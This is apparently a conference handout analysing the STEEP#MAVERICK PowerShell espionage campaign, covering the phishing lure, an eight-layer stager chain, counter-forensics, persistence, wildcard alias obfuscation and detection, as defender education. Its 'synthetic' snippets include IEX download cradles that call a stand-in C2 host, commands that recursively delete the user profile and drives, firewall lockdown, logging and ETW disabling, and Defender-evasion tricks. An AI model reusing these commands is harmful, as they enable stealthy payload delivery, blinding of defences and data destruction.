# STEEP#MAVERICK — The Campaign Deep-Dive

**Section reference:** Talk Section 2 ("STEEP#MAVERICK: The Campaign," 7 min)
**Audience:** Take-home technical manual for conference attendees
**Grounding:** Facts below are sourced from the original Securonix Threat Research
advisory and the team's own follow-up posts. Anything not independently verifiable from public
reporting is explicitly labeled **[illustrative/synthetic reconstruction]**. All code
in this document is defanged/synthetic and structurally representative — it is not a
working payload.

---

## 1. Campaign Overview

**STEEP#MAVERICK** is a cyberespionage campaign first documented by Securonix Threat
Research (Den Iuzvyk, Tim Peck, Oleg Kolesnikov) and publicly disclosed in a Security
Advisory on **September 29, 2022**. Campaign infrastructure (the `terma[.]*` domain
cluster) first appeared around **July 2022**, with active attacks against targets
observed through the "late summer" of that year.

**Targets:** Multiple military/weapons contractors in Europe, including — per
Securonix's assessment — what was "likely a strategic supplier to the F-35 Lightning
II fighter aircraft program." No formal nation-state attribution was published;
Securonix noted the malware would silently exit if the compromised system's language
was set to Chinese (`zh`) or Russian (`ru`) — a common but not conclusive
false-flag-avoidance / targeting-hygiene signal that analysts use as a soft attribution
clue, not proof.

**Why it matters for this talk:** STEEP#MAVERICK is, in the speaker's own account, the
origin story for **T1027.010 — Command Obfuscation**. The campaign's PowerShell stager
chain displayed a level of command-level obfuscation sophistication that the parent
technique, T1027 (Obfuscated Files or Information), was too coarse to describe on its
own — and that gap, encountered firsthand while reverse-engineering this exact chain,
is what put the researchers in the room for the sub-technique submission that became
T1027.010 (created in ATT&CK on 14 March 2023; Tim Peck is listed as a contributor
alongside George Thomas and TruKno). This is the speaker's firsthand throughline, not
a claim MITRE's citation record makes for itself — see the note at the end of Section 6
and the confidence table in the Appendix for exactly what is and isn't independently
verifiable here.

---

## 2. Initial Access & Social Engineering

The entry vector was deliberately unremarkable — a classic spear-phish, not an
exploit:

1. **Delivery:** A spear-phishing email carrying a compressed `.zip` attachment.
2. **Lure:** Inside the zip was a Windows shortcut (`.lnk`) file named
   **"Company & Benefits.lnk"**, styled to look like it opens a PDF describing employee
   benefits — a lure tuned for a corporate HR/recruiting pretext, plausible at a
   defense contractor with active hiring.
3. **Execution trick:** Rather than invoking `cmd.exe` or `powershell.exe` directly
   (both of which are well-instrumented and heavily signatured), the `.lnk` shell
   command used **`forfiles.exe`** — a legitimate, signed Windows utility for batch
   file operations — as a LOLBIN launcher to indirectly kick off the PowerShell chain.
   This is a process-lineage evasion: naive detections that alert on
   `explorer.exe → powershell.exe` miss `explorer.exe → forfiles.exe → powershell.exe`.
4. **Staging:** A copy of `powershell.exe` was placed in `C:\Windows` and renamed to
   **`AdobeAcrobatPDFReader`**, reinforcing the "this is just a PDF viewer" cover story
   to both the user and to naive process-name-based detections.
5. **First C2 contact:** The initial stager reached out to
   `hxxps://terma[.]dev/0` to retrieve the next stage.

**Takeaway for attendees:** the social engineering itself was low-effort and generic.
The sophistication budget was spent almost entirely downstream, on obfuscation and
counter-forensics — a pattern worth remembering when triaging "boring" phishing lures:
the payload chain is where the real investment often lives.

---

## 3. The Eight-Layer PowerShell Obfuscation Chain

Once the initial `.lnk` fired, it unrolled into what Securonix described as "a rather
large and robust chain of stagers" — eight discrete PowerShell layers, each one
decoding, decompressing, or de-obfuscating the next, and each layer independently
obfuscated so that static analysis of any single layer in isolation reveals little.

The table below summarizes the publicly reported technique per stage, based on the
Securonix advisory. Layer-internal code shown beneath each row is a
**synthetic reconstruction** built to be structurally representative of the reported
technique category — it is not a verbatim reproduction of the actual malware (which
Securonix did not publish line-for-line in full for every stage).

| Stage | Reported Technique(s) |
|-------|------------------------|
| 1 | `.lnk`-triggered execution, `IEX` to remote C2 |
| 2 | Reordering / symbol obfuscation, `IEX` obfuscation |
| 3 | Byte-value obfuscation, `IEX` obfuscation |
| 4–6 | Raw compression, `IEX` obfuscation (pattern repeated across three stages) |
| 7 | Reordering, string replace, backtick obfuscation, `IEX` obfuscation — **plus** AMSI evasion, anti-debugging, sandbox detection, and counter-forensics (see Section 4) |
| 8 | Final payload assembly and execution |

### Layer 1 — `.lnk`-triggered download cradle

The shortcut's target command runs a LOLBIN-fronted download-and-execute cradle. In
synthetic form:

```
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('hxxps://terma-corp[.]test/0')"
```

This is stage 1's entire job: fetch stage 2 as a string and hand it to `IEX`.

### Layer 2 — Reordering / symbol obfuscation

Stage 2 code arrives with tokens split and reassembled out of natural reading order,
using string concatenation and array-index tricks so that no contiguous substring in
the script matches a cmdlet name a signature engine would flag.

```powershell
# synthetic reconstruction — reordering/symbol obfuscation
$a = 'Ex','pression','Invoke-'
$b = -join $a[2,0,1]                     # reassembles to "Invoke-Expression"
$c = 'hxxps://terma-corp[.]test/stage2'
& $b ((New-Object Net.WebClient).DownloadString($c))
```

### Layer 3 — Byte-value obfuscation

Stage 3 encodes its payload as an array of raw byte/char values (decimal or hex),
decoded and cast back to a string at runtime — defeating any signature looking for
readable PowerShell syntax at rest.

```powershell
# synthetic reconstruction — byte-value obfuscation
$bytes = 73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110
$cmdName = -join ($bytes | ForEach-Object {[char]$_})   # "Invoke-Expression"
Invoke-Expression (
  (New-Object Net.WebClient).DownloadString('hxxps://terma-corp[.]test/stage3')
)
```

### Layers 4–6 — Raw compression (repeated)

Three successive stages wrap the next layer's code in raw DEFLATE/GZip compression,
base64-encoded for safe transit as a string, then decompressed and executed in memory.
Repeating this compress/decompress cradle three times in a row is itself an evasion
choice: automated sandbox unpacking tools that stop after one or two decode passes
(a common heuristic to bound analysis time) never reach the payload.

```powershell
# synthetic reconstruction — raw-compression stage, representative of layers 4-6
$compressed = [Convert]::FromBase64String('H4sIAAAAAAAAC...REDACTED-SYNTHETIC...')
$ms  = New-Object IO.MemoryStream(,$compressed)
$gz  = New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress)
$sr  = New-Object IO.StreamReader($gz)
$nextStage = $sr.ReadToEnd()
Invoke-Expression $nextStage
```

### Layer 7 — Reordering, string replace, backtick obfuscation + payload logic

Stage 7 is the "business logic" layer — this is where AMSI evasion, anti-debugging,
sandbox detection, and the counter-forensic self-destruct logic all live (Section 4
covers this in depth). Its own code is additionally wrapped in reordering, `.Replace()`
string-substitution obfuscation, and PowerShell's **backtick escape character** used to
split cmdlet names mid-token — a classic character-masking trick (the same family
John Hammond has demonstrated extensively):

```powershell
# synthetic reconstruction — backtick / string-replace obfuscation
# The backtick (`) is PowerShell's escape character; inserted mid-token it is
# silently stripped before the parser resolves the cmdlet name.
I`n`v`o`k`e-E`x`p`r`e`s`s`i`o`n (
  'INcmd'.Replace('IN','Invoke-').Replace('cmd','Expression')
  # 'INcmd' -> 'Invoke-cmd' -> 'Invoke-Expression' — traced step by step so it
  # actually evaluates to the literal string a reader would expect, not a
  # near-miss with a stray character in it.
)
```

### Layer 8 — Final payload assembly

The last stage assembles and executes the actual malware functionality — persistence
installation, defense-evasion configuration (Section 4), and beaconing — using the
same `IEX`-chained delivery pattern as every prior stage.

**Why chain eight layers instead of one strong one?** Redundancy and analyst fatigue.
Each layer is individually weak, but a reverse engineer (or an automated sandbox) has
to successfully defeat all eight, in sequence, with no shortcuts, before seeing stage 8.
Static signature matching on any single known-bad string is defeated because that
string only ever exists in decoded form, in memory, for one layer's brief lifetime.

---

## 4. Counter-Forensics: Sandbox Detection & Hostile Response

Stage 7 is where STEEP#MAVERICK's operational-security investment is most visible.
Rather than simply refusing to run in a sandbox (the common, "polite" approach), the
malware treats sandbox/analysis detection as a **hostile event** and responds
destructively.

### 4.1 Detection checks

Before proceeding, stage 7 evaluates the host environment:

- **Screen resolution:** fails the check if height is under 777 pixels (many
  sandbox/VM display drivers default to small or headless resolutions).
- **System age:** fails if the OS install is under 3 days old (fresh disposable VM
  images are a sandbox tell).
- **Physical memory:** fails if under 4 GB (`Win32_PhysicalMemory` via WMI —
  budget-configured analysis VMs are often memory-starved).
- **Hypervisor presence:** additional WMI queries checking for virtualization
  indicators.
- **System language:** if set to `*zh*` (Chinese) or `*ru*` (Russian), the process
  exits immediately — independent of any sandbox suspicion, this is a targeting/
  avoidance filter.
- **Analysis tooling / process checks:** the malware scans running processes for
  Fiddler, Procmon, Sysmon, IDA Pro (and variants), dnSpy, and debuggers including
  OllyDbg, x64dbg, and WinDbg, plus reverse-engineering suites Ghidra, Radare2, and
  Binary Ninja. **This is a representative, non-exhaustive subset** — the Securonix
  advisory's actual process-check list runs to roughly 30 tools (also including
  ProcessHacker, PEStudio, PEiD, HexRays, Scylla, BinDiff, Autoruns, PE-bear, and
  others); the subset above is chosen for the talk because it covers the categories
  (traffic proxy, process monitor, disassembler/decompiler, debugger) attendees are
  most likely to actually be running.

```powershell
# synthetic reconstruction — representative sandbox-check logic
Add-Type -AssemblyName System.Windows.Forms   # required before the Screen API below resolves

$badLang = 'zh','ru'
if ($badLang -contains (Get-WinSystemLocale).Name.Substring(0,2)) { exit }

$mem = (Get-CimInstance Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum / 1GB
$res = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
$age = (New-TimeSpan -Start (Get-CimInstance Win32_OperatingSystem).InstallDate).Days

$analysisProcs = 'fiddler','procmon','sysmon','ida','idaq','dnspy','ollydbg','x64dbg','windbg','ghidra','radare2'
$found = Get-Process | Where-Object { $analysisProcs -contains $_.ProcessName.ToLower() }

if ($mem -lt 4 -or $res -lt 777 -or $age -lt 3 -or $found) {
    # -> hostile-environment branch, see 4.2
}
```

### 4.2 Hostile evasion response ("self-destruct")

If sandbox indicators are found, STEEP#MAVERICK does not just quietly exit. It
actively degrades the host's forensic value and network reachability:

1. **Disable network adapters** — cutting off any chance of the sandbox capturing
   further C2 traffic or the analyst pivoting live.
2. **Firewall lockdown via `netsh`** — configures the Windows Firewall to block all
   inbound and outbound traffic, belt-and-suspenders on top of adapter disabling.
3. **Recursive destructive deletion** — recursively deletes the current user's
   profile directory, plus the `G:`, `F:`, and `E:` drives, using an obfuscated
   invocation of `Remove-Item` via the same wildcard-alias pattern detailed in full
   in Section 5 below — reported as `(&gal [?r0]*m)`, which resolves to `Remove-Item`
   without ever writing that cmdlet name into the script.
4. **Forced shutdown** — `Stop-Computer` to end the session outright.

```powershell
# synthetic reconstruction — hostile response branch (defanged, illustrative only)
# Real malware would not print warnings; shown here for teaching clarity.
Get-NetAdapter | Disable-NetAdapter -Confirm:$false
netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound

# Obfuscated Remove-Item call — the actual reported wildcard-alias pattern,
# NOT a literal "Remove-Item" lookup (that would defeat the whole point of the
# technique). Reported form uses the & call operator, not the dot-source operator
# used for the IEX pattern in Section 5. The bullet above quotes the source
# fragment verbatim (`(&gal [?r0]*m)`); this line is functionally equivalent to
# that reported form, not a character-for-character copy of it (PowerShell
# treats a leading `&` inside vs. outside the parens as the same no-op call
# operator, so both invoke the resolved alias identically).
& (gal [?r0]*m) -Path "$env:USERPROFILE\*" -Recurse -Force -ErrorAction SilentlyContinue
foreach ($drive in 'G:','F:','E:') {
    & (gal [?r0]*m) -Path "$drive\*" -Recurse -Force -ErrorAction SilentlyContinue
}
Stop-Computer -Force
```

**Why this matters:** this converts a routine sandbox-detonation attempt into a
destructive incident against the analysis environment itself. It also means a
mis-tuned or under-resourced production EDR/analysis VM that happens to trip one of
these thresholds (low RAM, small display) can suffer real data loss — this is not
purely an academic sandbox-evasion concern.

### 4.3 Logging & telemetry evasion

Once past the checks, before doing anything else "loud," the malware attacks its own
telemetry trail:

- **AMSI evasion** deployed at the start of stage 7.
- **PowerShell Script Block Logging** disabled.
- **ETW (Event Tracing for Windows) for PowerShell** disabled via
  `Remove-EtwTraceProvider`.
- **Module logging** and related PowerShell logging registry keys disabled directly.

```powershell
# synthetic reconstruction — logging-evasion sequence
Remove-EtwTraceProvider -Guid '{A0C1853B-5C40-4B15-8766-3CF1C58F985A}' -ErrorAction SilentlyContinue
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -Name 'EnableModuleLogging' -Value 0
```

**Speaker talking point:** this is the direct link to Section 5 of the talk (the
telemetry problem) — the entire back half of the deck exists because campaigns like
this one deliberately blind exactly the log sources that would otherwise catch it.

### 4.4 Defense (Windows Defender) tampering

Once satisfied it is not being watched, the malware grants itself breathing room:

- Adds Defender path/process exclusions for `forfiles.exe`, `powershell.exe`,
  `cmd.exe`.
- Adds extension exclusions for `.lnk`, `.rar`, `.exe`.
- Adds directory exclusions covering `%TEMP%`, `Public`, `Downloads`, `Documents`,
  `Desktop`, and `System32\Tasks`.
- Disables archive scanning.
- Invokes `MpCmdRun.exe -RemoveDefinitaions -All` to strip installed Defender
  signature definitions outright. That flag name is reproduced here exactly as it
  appears in the Securonix advisory, typo included (`Definitaions`, not
  `Definitions`) — we're grounding to the source rather than silently "fixing"
  what the attacker actually typed.

### 4.5 Persistence (context, not the talk's focus but useful for the guide)

Persistence itself isn't a Section 2 talking point, but it's worth attendees having
for the take-home reference, since it reuses the same character-masking primitives
covered in Section 5:

- **Registry Run-key-style hijack:** `HKLM:\Software\Classes\ms-offices\Shell\Open\command`
  set to a case-randomized command chain
  (reported form: `fOrfIlEs /"m" wusa* /"c" "p"O"we"r"s"h"e"L"l ...`) — case
  randomization defeats case-sensitive string signatures while PowerShell/cmd parse
  identifiers case-insensitively.
- **Scheduled tasks** named `MicrosoftEdgeUpdateTaskMachine_System` /
  `_User`, invoked via a wildcard-expanded path
  (reported form: `$env:???t??r???\*2\??h???k?*` resolving to `schtasks.exe`).
- **Startup shortcut** `MicrosoftWS.lnk` dropped in the Startup folder, launched via
  a `pcalua.exe → wsreset.exe` LOLBIN chain, which terminates at its own separate
  registry key — `HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`
  — distinct from the `ms-offices` key above; the malware uses at least two separate
  Classes-hive hijacks side by side, not one.
- **WMI event subscription** persistence with a custom filter/consumer pair.

---

## 5. The Wildcard IEX Invocation Pattern (a.k.a. "Globfuscation")

This is the centerpiece novel technical finding of STEEP#MAVERICK — the single pattern
the speaker points to as the trigger for pursuing the T1027.010 submission.

### 5.1 The core idea

PowerShell aliases and cmdlet names can be **resolved by wildcard pattern match**
rather than typed literally. `Get-Alias` (`gal`) and `Get-Command` (`gcm`) both accept
a `-Name` parameter (or positional equivalent) that supports wildcards (`*`, `?`).
If a wildcard pattern happens to match **exactly one** alias or command on the system,
that resolved object can be invoked directly with the call operator `&` — and the
attacker's script never once contains the literal string `Invoke-Expression`, `iex`,
`Invoke-RestMethod`, or `Remove-Item`.

Securonix's own follow-up research post ("Hiding the PowerShell Execution Flow")
documents the exact mechanism as it appeared in STEEP#MAVERICK, and credits security
researcher **John Hammond** with coining the term **"Globfuscation"** for this
data-masking technique after he demonstrated it publicly.

### 5.2 Worked example

```powershell
# Step 1: this is what the built-in alias table looks like (trimmed, illustrative)
PS> Get-Alias | Select-Object Name, ResolvedCommand | Format-Table
Name    ResolvedCommand
----    ---------------
iex     Invoke-Expression
irm     Invoke-RestMethod
gal     Get-Alias
gcm     Get-Command
...

# Step 2: a wildcard query that matches exactly one alias
PS> Get-Alias -Name '?e[?x]'
CommandType     Name
-----------     ----
Alias           iex -> Invoke-Expression

# The pattern reads as: any single char, then 'e', then (any single char, then 'x')
# On a default PowerShell install, the ONLY alias matching "?e[?x]" is "iex".
# No default alias table entry contains the literal substring "iex" spelled out
# in the attacker's own source — it's derived at runtime from the live alias table.
```

Chained directly into an invocation:

```powershell
# synthetic reconstruction — structurally faithful to the reported STEEP#MAVERICK pattern
# Resolve "iex" via wildcard match against Get-Alias, then call it with & (call operator)
.(gal ?e[?x]) (
    (New-Object Net.WebClient).DownloadString('hxxps://terma-corp[.]test/stage2')
)

# Equivalent using Get-Command instead of Get-Alias — either resolves the same way
.(gcm ?e[?x]) $payloadString
```

The Securonix advisory documents the same wildcard technique applied to other cmdlets
in the destructive cleanup routine (Section 4.2) — reported as
`(&gal [?r0]*m)` resolving to `Remove-Item` — showing this wasn't a one-off trick
scoped only to `IEX`, but a general-purpose obfuscation primitive the malware authors
reused throughout the chain wherever they needed to call a cmdlet without naming it.

### 5.3 Why this defeated signature-based detection at the time (2022)

- **No literal cmdlet string ever appears.** Static signatures — YARA rules,
  antivirus string matches, naive SIEM `CONTAINS "Invoke-Expression"` or
  `CONTAINS "iex "` detections — have nothing to match against. The string `iex`
  exists only as a *runtime-resolved value*, produced by querying the live
  environment's own alias table, not as source text.
- **It's built entirely from "boring" cmdlets.** `Get-Alias` and `Get-Command` are
  ubiquitous, benign, and used constantly by legitimate scripts and admins. Nobody in
  2022 was writing detection logic that treated `Get-Alias -Name '?e[?x]'` itself as
  suspicious, because nobody had catalogued wildcard-based alias resolution as an
  obfuscation *category* — there was no ATT&CK sub-technique describing it.
  Parent T1027 ("Obfuscated Files or Information") was accurate at a high level but
  gave defenders nothing specific enough to build a rule against.
  This is the exact gap that Section 6 below (and the talk's Section 3) addresses.
- **It's cheap and portable.** Unlike heavier obfuscation (custom crypters, packers),
  this technique requires no external tooling — it's pure PowerShell syntax abusing
  a documented, intended feature (wildcard parameter binding), which means it survives
  copy-paste into completely unrelated campaigns with zero adaptation cost. (This is
  exactly what Section 4 of the talk — GreenCharlie, MuddyWater ClickFix, ClearFake —
  demonstrates: the wrapper changes, this primitive doesn't.)
- **Behavioral logging didn't fill the gap by default.** Even where Script Block
  Logging (4104) was enabled, it captures the *literal script text as written* —
  which is precisely the obfuscated wildcard call, not the resolved cmdlet name.
  Analysts still had to know to look for `.(gal` / `.(gcm` patterns specifically;
  without that knowledge, even good telemetry didn't translate into detection.

### 5.4 Detection angle (what actually closes this gap)

Signature-based string matching on cmdlet names is structurally incapable of catching
this pattern — you cannot signature a string that's never written down. What works
instead is **behavioral / structural** detection:

- Alert on `Get-Alias` or `Get-Command` invocations immediately followed by a call
  operator (`&` or `.`) applied to their output, especially with wildcard arguments
  containing `?` or `*`.
- Alert on wildcard patterns targeting suspicious character shapes — e.g. any pattern
  resolving to a 2-4 character alias for a "dangerous" cmdlet class (execution,
  deletion, network).
- This requires **content-aware** telemetry — Script Block Logging (4104) capturing
  the deobfuscated *behavior*, not just process-creation command lines — which is
  exactly why the talk pivots to the telemetry stack in the sections following this
  one.

(Full Sigma-style detection logic for this pattern lives in `detection/` — out of
scope for this guide, which covers the campaign, not the finished ruleset.)

---

## 6. The Gap in ATT&CK — Why T1027.010 Had to Exist

At the time STEEP#MAVERICK was analyzed (2022), MITRE ATT&CK's obfuscation coverage
began and ended at **T1027 — Obfuscated Files or Information**: a broad technique
describing files/information made difficult to discover or analyze. It was accurate
as a category, but it gave defenders no vocabulary for the specific *mechanics*
observed in this campaign:

- Wildcard-based alias/command resolution to avoid ever writing a cmdlet name.
- Backtick-based mid-token character insertion.
- Case randomization defeating case-sensitive matching.
- String-splitting/reordering/reassembly at the command level, as opposed to
  file-level packing or encoding.

None of that had a dedicated home. A researcher trying to write a detection rule, or
a threat intel analyst trying to describe the technique in a report, had only the
coarse parent technique to cite — which meant campaign write-ups, detection content,
and cross-campaign comparison all lost precision. Two completely different
obfuscation mechanisms (a packed binary vs. a wildcard-aliased `IEX` call) would both
just be tagged "T1027."

That mismatch between what the campaign actually did and what the framework let you
say about it is, in the speaker's own account, what drove the submission of
**T1027.010: Command Obfuscation** as a sub-technique — explicitly scoped to
obfuscation applied to *commands and scripts at execution time* (aliases, wildcards,
environment variables, string concatenation, special/escape characters used to defeat
pattern matching), as distinct from file-level obfuscation. T1027.010 was created in
ATT&CK on 14 March 2023, with Tim Peck listed among its contributors.

**Worth saying plainly, not just footnoting:** MITRE's current T1027.010 reference
list doesn't cite the STEEP#MAVERICK advisory by name — it cites a later Securonix
piece the same team published on a different campaign (DEEP#DRIVE) instead. So the
"this campaign → this sub-technique" line is a firsthand account of the throughline,
not a fact you can independently verify by pulling up the ATT&CK page mid-talk. What
*is* independently verifiable: Tim Peck is a listed contributor to T1027.010, the
timeline lines up (campaign published September 2022, sub-technique created March
2023), and the technical gap described above is real and matches what the campaign
actually did. Said out loud: this is the campaign that put the gap in front of the
researchers and got them pulled onto the sub-technique — not a MITRE-documented
citation trail.

**This is the pivot point into Section 3 of the talk:** having lived through the
campaign that exposed the gap, the natural next beat is the technique submission
story itself — what T1027.010 formally codifies, and how it maps back onto exactly
the primitives walked through above.

---

## Appendix: Fact-confidence summary for this guide

| Claim | Confidence | Basis |
|---|---|---|
| Campaign name, dates, targets, delivery mechanism (.lnk/.zip, forfiles) | High | Directly reported, Securonix advisory + corroborating press coverage |
| Eight-layer structure and per-layer technique labels (table in Section 3) | High | Directly reported, Securonix advisory |
| Verbatim PowerShell code for each layer | **Illustrative/synthetic reconstruction** | Securonix did not publish full verbatim code for every stage; code here is structurally representative, not a literal quote |
| Counter-forensic checks/thresholds (777px, 3 days, 4GB, zh/ru exit) | High | Directly reported, Securonix advisory |
| Hostile response (adapter disable, firewall block, recursive delete, shutdown) | High | Directly reported, Securonix advisory |
| Logging/AMSI/Defender tampering specifics | High | Directly reported, Securonix advisory |
| Wildcard `Get-Alias`/`Get-Command` → `IEX`/`Remove-Item` pattern and reported syntax (`(gal ?e[?x])`, `(&gal [?r0]*m)`) | High | Directly reported, Securonix "Hiding the PowerShell Execution Flow" follow-up post, explicitly tied to STEEP#MAVERICK |
| "Globfuscation" name attributed to John Hammond | High | Directly stated by Securonix in the same follow-up post |
| T1027.010 creation date and contributors (incl. Tim Peck) | High | Directly confirmed on the live MITRE ATT&CK T1027.010 page |
| Direct causal line "STEEP#MAVERICK research → T1027.010 submission" | Medium — narrative framing, not a formal MITRE citation | Tim Peck's contributor credit and the timeline (campaign published Sept 2022; sub-technique created March 2023) are consistent with this story, and it is the speaker's own firsthand account per the master brief. However, the current live T1027.010 references list does **not** cite the STEEP#MAVERICK advisory by name (it cites a later Securonix DEEP#DRIVE write-up instead). Flagged here for the speaker/critic to be aware of — the causal narrative is credible and speaker-authoritative but not independently verifiable purely from MITRE's current citation list. |
